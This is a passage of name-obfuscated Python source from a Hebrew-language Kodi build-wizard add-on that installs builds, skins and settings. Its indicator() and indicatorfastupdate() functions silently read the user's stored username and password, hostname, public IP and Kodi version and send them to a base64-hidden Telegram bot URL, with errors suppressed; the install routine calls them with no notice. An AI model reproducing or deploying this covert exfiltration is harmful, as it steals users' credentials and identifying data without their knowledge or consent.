			O0O0O0000OOOO0000 =int (percentage (OOOO000OO0O0O0O0O ,len (OOOOOO00O0OO00OOO )))#line:3396
			DP .update (O0O0O0000OOOO0000 ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,OO00OO000O00000OO ))#line:3397
			addonDatabase (OO00OO000O00000OO ,1 )#line:3398
			if DP .iscanceled ():break #line:3399
		if DP .iscanceled ():#line:3400
			DP .close ()#line:3401
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3402
			sys .exit ()#line:3403
		DP .close ()#line:3404
	forceUpdate ()#line:3405
def indicator ():#line:3406
       try :#line:3407
          import json #line:3408
          wiz .log ('FRESH MESSAGE')#line:3409
          O0OO00O0O0O00OOOO =(ADDON .getSetting ("user"))#line:3410
          O00OOO0000O00OOOO =(ADDON .getSetting ("pass"))#line:3411
          O00OOOOO0000O0O00 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3412
          O00O00O0000OOOO00 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:3413
          O000O0OO0OOOO00OO =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3414
          OOOOOO00OOO0OOO00 =str (json .loads (O000O0OO0OOOO00OO )['ip'])#line:3415
          OO0O0OOOOOO0OO000 =O0OO00O0O0O00OOOO #line:3416
          O00O0O0O0O0O00OOO =O00OOO0000O00OOOO #line:3417
          import socket #line:3418
          O000O0OO0OOOO00OO =urllib2 .urlopen (O00O00O0000OOOO00 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OO0O0OOOOOO0OO000 +' - '+O00O0O0O0O0O00OOO +' - '+O00OOOOO0000O0O00 +' - '+OOOOOO00OOO0OOO00 ).readlines ()#line:3419
       except :pass #line:3421
def indicatorfastupdate ():#line:3422
       try :#line:3423
          import json #line:3424
          wiz .log ('FRESH MESSAGE')#line:3425
          OOO0OOOOOO0O000O0 =(ADDON .getSetting ("user"))#line:3426
          O00OOOO0O0O0OO0O0 =(ADDON .getSetting ("pass"))#line:3427
          OOOO0OOOOOOOO0OOO =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3428
          O0OOO0O00OOOOOOOO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:3430
          OOO0O00000OO000O0 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3431
          OOO0OOO0OO0O00OO0 =str (json .loads (OOO0O00000OO000O0 )['ip'])#line:3432
          O000O00O00O0O0O0O =OOO0OOOOOO0O000O0 #line:3433
          O0OO0OOO0O00OO00O =O00OOOO0O0O0OO0O0 #line:3434
          import socket #line:3435
          OOO0O00000OO000O0 =urllib2 .urlopen (O0OOO0O00OOOOOOOO .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O000O00O00O0O0O0O +' - '+O0OO0OOO0O00OO00O +' - '+OOOO0OOOOOOOO0OOO +' - '+OOO0OOO0OO0O00OO0 ).readlines ()#line:3436
       except :pass #line:3438
def skinfix18 ():#line:3439
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:3440
		OOOO00O00O0O000OO =wiz .workingURL (SKINID18DDONXML )#line:3441
		if OOOO00O00O0O000OO ==True :#line:3442
			O0OO0O00OOOO0O00O =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:3443
			if len (O0OO0O00OOOO0O00O )>0 :#line:3444
				OO00O0O0O0000O00O ='%s-%s.zip'%(SKINID18 ,O0OO0O00OOOO0O00O [0 ])#line:3445
				O000000OO00OO0OO0 =wiz .workingURL (SKIN18ZIPURL +OO00O0O0O0000O00O )#line:3446
				if O000000OO00OO0OO0 ==True :#line:3447
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3448
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3449
					O0O0OOO0OOOO00O0O =os .path .join (PACKAGES ,OO00O0O0O0000O00O )#line:3450
					try :os .remove (O0O0OOO0OOOO00O0O )#line:3451
					except :pass #line:3452
					downloader .download (SKIN18ZIPURL +OO00O0O0O0000O00O ,O0O0OOO0OOOO00O0O ,DP )#line:3453
					extract .all (O0O0OOO0OOOO00O0O ,HOME ,DP )#line:3454
					try :#line:3455
						O000O0OO000OOO00O =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3456
						OOO0OOO00OOO0OOOO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3457
						os .rename (O000O0OO000OOO00O ,OOO0OOO00OOO0OOOO )#line:3458
					except :#line:3459
						pass #line:3460
					try :#line:3461
						O0O00OOO0OO0O0O0O =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');OO0000000O0OO0000 =O0O00OOO0OO0O0O0O .read ();O0O00OOO0OO0O0O0O .close ()#line:3462
						O0OOOO000OOOO0O0O =wiz .parseDOM (OO0000000O0OO0000 ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:3463
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OOOO000OOOO0O0O [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:3464
					except :#line:3465
						pass #line:3466
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:3467
					DP .close ()#line:3468
					xbmc .sleep (500 )#line:3469
					wiz .forceUpdate (True )#line:3470
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3471
				else :#line:3472
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3473
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O000000OO00OO0OO0 ,xbmc .LOGERROR )#line:3474
			else :#line:3475
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3476
		else :#line:3477
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3478
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3479
def skinfix17 ():#line:3480
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:3481
		O0O00OOO00O0OO000 =wiz .workingURL (SKINID17DDONXML )#line:3482
		if O0O00OOO00O0OO000 ==True :#line:3483
			OO0O0O00OOOOOOO00 =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:3484
			if len (OO0O0O00OOOOOOO00 )>0 :#line:3485
				OO0O0O00O00O00O0O ='%s-%s.zip'%(SKINID17 ,OO0O0O00OOOOOOO00 [0 ])#line:3486
				OOO0000O0OO00O000 =wiz .workingURL (SKIN17ZIPURL +OO0O0O00O00O00O0O )#line:3487
				if OOO0000O0OO00O000 ==True :#line:3488
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3489
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3490
					O0000OOO0OO0OO0OO =os .path .join (PACKAGES ,OO0O0O00O00O00O0O )#line:3491
					try :os .remove (O0000OOO0OO0OO0OO )#line:3492
					except :pass #line:3493
					downloader .download (SKIN17ZIPURL +OO0O0O00O00O00O0O ,O0000OOO0OO0OO0OO ,DP )#line:3494
					extract .all (O0000OOO0OO0OO0OO ,HOME ,DP )#line:3495
					try :#line:3496
						OOOOO0O0OOOOOO00O =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3497
						OO0O000OOO00O0000 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3498
						os .rename (OOOOO0O0OOOOOO00O ,OO0O000OOO00O0000 )#line:3499
					except :#line:3500
						pass #line:3501
					try :#line:3502
						O00OOOO000O0000OO =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');OO0O000O0OO00OOOO =O00OOOO000O0000OO .read ();O00OOOO000O0000OO .close ()#line:3503
						OO0000O0OOO0O0O00 =wiz .parseDOM (OO0O000O0OO00OOOO ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:3504
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0000O0OOO0O0O00 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:3505
					except :#line:3506
						pass #line:3507
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:3508
					DP .close ()#line:3509
					xbmc .sleep (500 )#line:3510
					wiz .forceUpdate (True )#line:3511
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3512
				else :#line:3513
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3514
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%OOO0000O0OO00O000 ,xbmc .LOGERROR )#line:3515
			else :#line:3516
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3517
		else :#line:3518
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3519
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3520
def fix17update ():#line:3521
	if KODIV >=17 and KODIV <18 :#line:3522
		wiz .kodi17Fix ()#line:3523
		xbmc .sleep (4000 )#line:3524
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3525
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3526
		fixfont ()#line:3527
		O00OO0OOOO0OO00OO =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3528
		try :#line:3530
			O0OOO000O0O0O0OOO =open (O00OO0OOOO0OO00OO ,'r')#line:3531
			OOO0OO00OO0OO0O00 =O0OOO000O0O0O0OOO .read ()#line:3532
			O0OOO000O0O0O0OOO .close ()#line:3533
			OO00O00OOO0OO00OO ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:3534
			O0O000O0OO0OO00O0 =re .compile (OO00O00OOO0OO00OO ).findall (OOO0OO00OO0OO0O00 )[0 ]#line:3535
			O0OOO000O0O0O0OOO =open (O00OO0OOOO0OO00OO ,'w')#line:3536
			O0OOO000O0O0O0OOO .write (OOO0OO00OO0OO0O00 .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%O0O000O0OO0OO00O0 ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:3537
			O0OOO000O0O0O0OOO .close ()#line:3538
		except :#line:3539
				pass #line:3540
		wiz .kodi17Fix ()#line:3541
		O00OO0OOOO0OO00OO =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3542
		try :#line:3543
			O0OOO000O0O0O0OOO =open (O00OO0OOOO0OO00OO ,'r')#line:3544
			OOO0OO00OO0OO0O00 =O0OOO000O0O0O0OOO .read ()#line:3545
			O0OOO000O0O0O0OOO .close ()#line:3546
			OO00O00OOO0OO00OO ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:3547
			O0O000O0OO0OO00O0 =re .compile (OO00O00OOO0OO00OO ).findall (OOO0OO00OO0OO0O00 )[0 ]#line:3548
			O0OOO000O0O0O0OOO =open (O00OO0OOOO0OO00OO ,'w')#line:3549
			O0OOO000O0O0O0OOO .write (OOO0OO00OO0OO0O00 .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%O0O000O0OO0OO00O0 ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:3550
			O0OOO000O0O0O0OOO .close ()#line:3551
		except :#line:3552
				pass #line:3553
		swapSkins ('skin.Premium.mod')#line:3554
def fix18update ():#line:3556
	if KODIV >=18 :#line:3557
		xbmc .sleep (4000 )#line:3558
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3559
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3560
		fixfont ()#line:3561
		O0O0O00OOO0O00000 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3562
		try :#line:3563
			OO0OO0OO0O000O00O =open (O0O0O00OOO0O00000 ,'r')#line:3564
			O0000OOO0000OOOO0 =OO0OO0OO0O000O00O .read ()#line:3565
			OO0OO0OO0O000O00O .close ()#line:3566
			O00OO0OOOO0OOO00O ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:3567
			O0000O000OOOOOO00 =re .compile (O00OO0OOOO0OOO00O ).findall (O0000OOO0000OOOO0 )[0 ]#line:3568
			OO0OO0OO0O000O00O =open (O0O0O00OOO0O00000 ,'w')#line:3569
			OO0OO0OO0O000O00O .write (O0000OOO0000OOOO0 .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%O0000O000OOOOOO00 ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:3570
			OO0OO0OO0O000O00O .close ()#line:3571
		except :#line:3572
				pass #line:3573
		wiz .kodi17Fix ()#line:3574
		O0O0O00OOO0O00000 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3575
		try :#line:3576
			OO0OO0OO0O000O00O =open (O0O0O00OOO0O00000 ,'r')#line:3577
			O0000OOO0000OOOO0 =OO0OO0OO0O000O00O .read ()#line:3578
			OO0OO0OO0O000O00O .close ()#line:3579
			O00OO0OOOO0OOO00O ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:3580
			O0000O000OOOOOO00 =re .compile (O00OO0OOOO0OOO00O ).findall (O0000OOO0000OOOO0 )[0 ]#line:3581
			OO0OO0OO0O000O00O =open (O0O0O00OOO0O00000 ,'w')#line:3582
			OO0OO0OO0O000O00O .write (O0000OOO0000OOOO0 .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%O0000O000OOOOOO00 ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:3583
			OO0OO0OO0O000O00O .close ()#line:3584
		except :#line:3585
				pass #line:3586
		swapSkins ('skin.Premium.mod')#line:3587
def buildWizard (O00OOOO0OOOO0O00O ,OO000O0O0O0O0OOOO ,theme =None ,over =False ):#line:3590
	if over ==False :#line:3591
		O00O0000OO0O0OOO0 =wiz .checkBuild (O00OOOO0OOOO0O00O ,'url')#line:3592
		if O00O0000OO0O0OOO0 ==False :#line:3594
			xbmc .executebuiltin ((u'Notification(%s,%s)'%('Kodi Anonymous','אנא המתן')))#line:3598
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:3599
			return #line:3600
		O00OOOO0000O0OO00 =wiz .workingURL (O00O0000OO0O0OOO0 )#line:3601
		if O00OOOO0000O0OO00 ==False :#line:3602
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,O00OOOO0000O0OO00 ))#line:3603
			return #line:3604
	if OO000O0O0O0O0OOOO =='gui':#line:3605
		if O00OOOO0OOOO0O00O ==BUILDNAME :#line:3606
			if over ==True :OOO0OOO0OO00OO000 =1 #line:3607
			else :OOO0OOO0OO00OO000 =1 #line:3608
		else :#line:3609
			OOO0OOO0OO00OO000 =1 #line:3610
		if OOO0OOO0OO00OO000 :#line:3611
			remove_addons ()#line:3612
			remove_addons2 ()#line:3613
			O000O00OOO00OOO00 =wiz .checkBuild (O00OOOO0OOOO0O00O ,'gui')#line:3614
			O0OO0O000O00O0O00 =O00OOOO0OOOO0O00O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3615
			if not wiz .workingURL (O000O00OOO00OOO00 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3616
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3617
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OOOO0OOOO0O00O ),'','אנא המתן')#line:3618
			OO000O00O00000OOO =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0OO0O000O00O0O00 )#line:3619
			try :os .remove (OO000O00O00000OOO )#line:3620
			except :pass #line:3621
			logging .warning (O000O00OOO00OOO00 )#line:3622
			if 'google'in O000O00OOO00OOO00 :#line:3623
			   OOOO0OOOOOOOOO0OO =googledrive_download (O000O00OOO00OOO00 ,OO000O00O00000OOO ,DP ,wiz .checkBuild (O00OOOO0OOOO0O00O ,'filesize'))#line:3624
			else :#line:3627
			  downloader .download (O000O00OOO00OOO00 ,OO000O00O00000OOO ,DP )#line:3628
			xbmc .sleep (100 )#line:3629
			OO0OOOOO0OO0O0O0O ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OOOO0OOOO0O00O )#line:3630
			DP .update (0 ,OO0OOOOO0OO0O0O0O ,'','אנא המתן')#line:3631
			extract .all (OO000O00O00000OOO ,HOME ,DP ,title =OO0OOOOO0OO0O0O0O )#line:3632
			DP .close ()#line:3633
			wiz .defaultSkin ()#line:3634
			wiz .lookandFeelData ('save')#line:3635
			wiz .kodi17Fix ()#line:3636
			if KODIV >=18 :#line:3637
				skindialogsettind18 ()#line:3638
			xbmc .executebuiltin ("ReloadSkin()")#line:3639
			if INSTALLMETHOD ==1 :OOO000OO000OOO0O0 =1 #line:3640
			elif INSTALLMETHOD ==2 :OOO000OO000OOO0O0 =0 #line:3641
			else :DP .close ()#line:3642
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:3643
			indicatorfastupdate ()#line:3644
		else :#line:3646
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3647
	if OO000O0O0O0O0OOOO =='gui2':#line:3648
		if O00OOOO0OOOO0O00O ==BUILDNAME :#line:3649
			if over ==True :OOO0OOO0OO00OO000 =1 #line:3650
			else :OOO0OOO0OO00OO000 =1 #line:3651
		else :#line:3652
			OOO0OOO0OO00OO000 =1 #line:3653
		if OOO0OOO0OO00OO000 :#line:3654
			remove_addons ()#line:3655
			remove_addons2 ()#line:3656
			O000O00OOO00OOO00 =wiz .checkBuild (O00OOOO0OOOO0O00O ,'gui')#line:3657
			O0OO0O000O00O0O00 =O00OOOO0OOOO0O00O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3658
			if not wiz .workingURL (O000O00OOO00OOO00 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3659
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3660
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OOOO0OOOO0O00O ),'','אנא המתן')#line:3661
			OO000O00O00000OOO =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0OO0O000O00O0O00 )#line:3662
			try :os .remove (OO000O00O00000OOO )#line:3663
			except :pass #line:3664
			logging .warning (O000O00OOO00OOO00 )#line:3665
			if 'google'in O000O00OOO00OOO00 :#line:3666
			   OOOO0OOOOOOOOO0OO =googledrive_download (O000O00OOO00OOO00 ,OO000O00O00000OOO ,DP ,wiz .checkBuild (O00OOOO0OOOO0O00O ,'filesize'))#line:3667
			else :#line:3670
			  downloader .download (O000O00OOO00OOO00 ,OO000O00O00000OOO ,DP )#line:3671
			xbmc .sleep (100 )#line:3672
			OO0OOOOO0OO0O0O0O ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OOOO0OOOO0O00O )#line:3673
			DP .update (0 ,OO0OOOOO0OO0O0O0O ,'','אנא המתן')#line:3674
			extract .all (OO000O00O00000OOO ,HOME ,DP ,title =OO0OOOOO0OO0O0O0O )#line:3675
			DP .close ()#line:3676
			wiz .defaultSkin ()#line:3677
			wiz .lookandFeelData ('save')#line:3678
			if INSTALLMETHOD ==1 :OOO000OO000OOO0O0 =1 #line:3681
			elif INSTALLMETHOD ==2 :OOO000OO000OOO0O0 =0 #line:3682
			else :DP .close ()#line:3683
		else :#line:3685
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3686
	elif OO000O0O0O0O0OOOO =='fresh':#line:3687
		freshStart (O00OOOO0OOOO0O00O )#line:3688
	elif OO000O0O0O0O0OOOO =='normal':#line:3689
		if url =='normal':#line:3690
			if KEEPTRAKT =='true':#line:3691
				traktit .autoUpdate ('all')#line:3692
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:3693
			if KEEPREAL =='true':#line:3694
				debridit .autoUpdate ('all')#line:3695
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:3696
			if KEEPLOGIN =='true':#line:3697
				loginit .autoUpdate ('all')#line:3698
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:3699
		OO0O0OOO00O00OOO0 =int (KODIV );O00OOO0O0OO00OOO0 =int (float (wiz .checkBuild (O00OOOO0OOOO0O00O ,'kodi')))#line:3700
		if not OO0O0OOO00O00OOO0 ==O00OOO0O0OO00OOO0 :#line:3701
			if OO0O0OOO00O00OOO0 ==16 and O00OOO0O0OO00OOO0 <=15 :O00O0OO00O0000O0O =False #line:3702
			else :O00O0OO00O0000O0O =True #line:3703
		else :O00O0OO00O0000O0O =False #line:3704
		if O00O0OO00O0000O0O ==True :#line:3705
			OO00OO00O000OOOOO =1 #line:3706
		else :#line:3707
			if not over ==False :OO00OO00O000OOOOO =1 #line:3708
			else :OO00OO00O000OOOOO =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:3709
		if OO00OO00O000OOOOO :#line:3710
			wiz .clearS ('build')#line:3711
			O000O00OOO00OOO00 =wiz .checkBuild (O00OOOO0OOOO0O00O ,'url')#line:3712
			O0OO0O000O00O0O00 =O00OOOO0OOOO0O00O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3713
			if not wiz .workingURL (O000O00OOO00OOO00 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3714
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3715
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OOOO0OOOO0O00O ,wiz .checkBuild (O00OOOO0OOOO0O00O ,'version')),'','אנא המתן')#line:3716
			OO000O00O00000OOO =os .path .join (PACKAGES ,'%s.zip'%O0OO0O000O00O0O00 )#line:3717
			try :os .remove (OO000O00O00000OOO )#line:3718
			except :pass #line:3719
			logging .warning (O000O00OOO00OOO00 )#line:3720
			if 'google'in O000O00OOO00OOO00 :#line:3721
			   OOOO0OOOOOOOOO0OO =googledrive_download (O000O00OOO00OOO00 ,OO000O00O00000OOO ,DP ,wiz .checkBuild (O00OOOO0OOOO0O00O ,'filesize'))#line:3722
			else :#line:3725
			  downloader .download (O000O00OOO00OOO00 ,OO000O00O00000OOO ,DP )#line:3726
			xbmc .sleep (1000 )#line:3727
			OO0OOOOO0OO0O0O0O ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OOOO0OOOO0O00O ,wiz .checkBuild (O00OOOO0OOOO0O00O ,'version'))#line:3728
			DP .update (0 ,OO0OOOOO0OO0O0O0O ,'','Please Wait')#line:3729
			O0O0O00OOOO0OO000 ,O0000OOOOO0OOOOOO ,OOO0000OO00O000O0 =extract .all (OO000O00O00000OOO ,HOME ,DP ,title =OO0OOOOO0OO0O0O0O )#line:3730
			if int (float (O0O0O00OOOO0OO000 ))>0 :#line:3731
				wiz .fixmetas ()#line:3732
				wiz .lookandFeelData ('save')#line:3733
				wiz .defaultSkin ()#line:3734
				wiz .setS ('buildname',O00OOOO0OOOO0O00O )#line:3736
				wiz .setS ('buildversion',wiz .checkBuild (O00OOOO0OOOO0O00O ,'version'))#line:3737
				wiz .setS ('buildtheme','')#line:3738
				wiz .setS ('latestversion',wiz .checkBuild (O00OOOO0OOOO0O00O ,'version'))#line:3739
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:3740
				wiz .setS ('installed','true')#line:3741
				wiz .setS ('extract',str (O0O0O00OOOO0OO000 ))#line:3742
				wiz .setS ('errors',str (O0000OOOOO0OOOOOO ))#line:3743
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O0O0O00OOOO0OO000 ,O0000OOOOO0OOOOOO ))#line:3744
				O00O00OOO0O00OO00 =(ADDON .getSetting ("gaiaseren"))#line:3746
				if O00O00OOO0O00OO00 =='true':#line:3747
					wiz .kodi17Fix ()#line:3748
				fastupdatefirstbuild (NOTEID )#line:3749
				skin_homeselect ()#line:3750
				skin_lower ()#line:3751
				rdbuildinstall ()#line:3752
				try :gaiaserenaddon ()#line:3754
				except :pass #line:3755
				adults18 ()#line:3756
				skinfix18 ()#line:3757
				try :os .remove (OO000O00O00000OOO )#line:3759
				except :pass #line:3760
				if O00O00OOO0O00OO00 =='true':#line:3762
					wiz .kodi17Fix ()#line:3763
				if int (float (O0000OOOOO0OOOOOO ))>0 :#line:3765
					OOO0OOO0OO00OO000 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OOOO0OOOO0O00O ,wiz .checkBuild (O00OOOO0OOOO0O00O ,'version')),'הושלם: [COLOR %s]%s%s[/COLOR] [שגיאות:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,O0O0O00OOOO0OO000 ,'%',COLOR1 ,O0000OOOOO0OOOOOO ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:3766
					if OOO0OOO0OO00OO000 :#line:3767
						if isinstance (O0000OOOOO0OOOOOO ,unicode ):#line:3768
							OOO0000OO00O000O0 =OOO0000OO00O000O0 .encode ('utf-8')#line:3769
						wiz .TextBox (ADDONTITLE ,OOO0000OO00O000O0 )#line:3770
				DP .close ()#line:3771
				O000O0O00OO00OOOO =wiz .themeCount (O00OOOO0OOOO0O00O )#line:3772
				indicator ()#line:3773
				if not O000O0O00OO00OOOO ==False :#line:3774
					buildWizard (O00OOOO0OOOO0O00O ,'theme')#line:3775
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:3776
				if INSTALLMETHOD ==1 :OOO000OO000OOO0O0 =1 #line:3777
				elif INSTALLMETHOD ==2 :OOO000OO000OOO0O0 =0 #line:3778
				else :resetkodi ()#line:3779
				if OOO000OO000OOO0O0 ==1 :wiz .reloadFix ()#line:3781
				else :wiz .killxbmc (True )#line:3782
			else :#line:3783
				if isinstance (O0000OOOOO0OOOOOO ,unicode ):#line:3784
					OOO0000OO00O000O0 =OOO0000OO00O000O0 .encode ('utf-8')#line:3785
				O0OO0OO0OOOO00000 =open (OO000O00O00000OOO ,'r')#line:3786
